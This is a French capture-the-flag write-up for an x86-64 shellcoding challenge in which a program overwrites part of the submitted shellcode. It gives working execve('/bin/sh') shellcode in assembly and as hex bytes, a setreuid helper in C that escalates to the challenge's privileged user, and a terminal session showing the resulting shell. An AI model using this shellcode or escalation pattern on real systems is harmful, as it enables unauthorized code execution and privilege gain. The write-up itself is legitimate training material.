# ELF x64 - Shellcoding - Sheep warmup

## 25 Points

### Un petit saute-moutons pour s’échauffer

# Énoncé

Le programme suivant exécutera le shellcode que vous lui fournirez ... après que des moutons s’installent dedans !

## Solution
L'objectif est de trouver un moyen d'afficher le contenu du fichier ~/.passwd. Le problème étant qu'il n'est lisible que par une personne avec le rôle challenge-ch12-cracked (1155), or on a le rôle challenge-ch12 (1154).
On nous un fichier ch12.s, qui est un code en assembleur 64-bits et un exécutable ch12 qui est le fichier ch12.s compilé. Lorsque l'on lance ch12, on tombe sur un prompt qui nous demande d'envoyer un input. On va donc prendre cela comme une faille et commencer à regarder comment est-ce qu'on pourrait faire pour qu'à partir de cet input, on puisse faire cat .passwd.

Le premier obstacle est que lorsque que l'on va donner une string en input, on va avoir un mouton qui bêle. Si on regarde bien dans le code, on va s'aperçevoir que les bytes 2 à 9 sont rempli par des "BEEEH":

```s
#  Setting up the land (the shellcode)  #
smov    $SYS_READ,      r_syscall
smov    $STDIN,         r_arg1
movq    $land,          r_arg2
smov    $LANDSIZE,      r_arg3
syscall
```

Il faut donc trouver un moyen de contourner cela.
Pour remplir toutes ces conditions, on va tout d'abord coder un fichier /tmp/new/shell.s dans lequel on va faire ceci:

```s
.section .text
.globl _start
_start:
    jmp skip_instructions
    nop
    nop
    nop
    nop
    nop
    nop
    nop

skip_instructions:
    push $0x3b
    pop %rax
    xor %rdx, %rdx
    movabs $0x68732f6e69622f2f, %r8    
    shr $0x8, %r8                    
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall
    push $0x3c
    pop %rax
    xor %rdi, %rdi
    syscall
```

Ce code fait tout d'abord un jump par dessus les 7 bytes que l'on veut skip, et rempli les rempli d'instruction de 1 byte: nop. En suite, il va faire execve("/bin/sh"). On le compile et on récupère les bytes de ce fichier:

```bash
cc -Wall -m64 -nostdlib -c shell.s
ld -N -o shell shell.o
objdump -d shell
```
Puis on fait une ligne de commande ou l'objectif est d'envoyé test.s en hexadécimal en tant qu'input:

```bash
echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" | ./ch12
```

Là, on rencontre un problème, le programme se ferme instantanemment. Pour éviter cela, on va changer la ligne de commande et rajouter ; cat pour que le shell trouve une entrée standard pour qu'il puisse se runva donc :

```bash
(echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" ; cat) | ./ch12
```

A ce moment là, on a bien un shell qui se lance, le problème est que l'on se retrouve avec le mauvais rôle, on est encore challenge-ch12. Il faut donc trouver un moyen de pour faire un setuid(1155). Pour pouvoir faire cela, on va créer une shell.c dans lequel on va faire setreuid(1155, 1155), puis lancer un shell /bin/bash:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
   setreuid(1155, 1155); // 1155 is challenge-ch12-cracked, might need to be modified for your user
   system("/bin/bash");

   return 0;
}
```
en suite, on le compile:
```bash
gcc -o aa shell.c
```

Et ici, on va chercher à le compiler avec autant de lettre que sh pour que lorsque l'on va l'appeler dans shell.s, on ne dépasse pas les 8 octets au niveau de la string. Pour cela, il faudrat aussi faire:
```bash
mv aa /tmp
```

On va donc remplacer dans shell.s, /bin/sh par /tmp/aa, ce qui donne:

```s
movabs $0x68732f6e69622f2f, %r8 #/bin/sh -> movabs $0x61612f706d742f2f, %r8 # /tmp/aa
```

on recompile tout ça, puis faire l'objdump pour récupére la string en hexadécimal et pouvoir lancer la ligne de commande:

```bash
programmation-ch12@challenge01:~$ (echo -ne "\xeb\x07\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x74\x6d\x70\x2f\x61\x61\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" ;cat) | ./ch12
===== Basic Shellcode Executor =====
Input shellcode: ls
Makefile  ch12  ch12.s
id
uid=1155(programmation-ch12-cracked) gid=1154(programmation-ch12) groups=1154(programmation-ch12),100(users)
cat .passwd
[censorship]
exit
```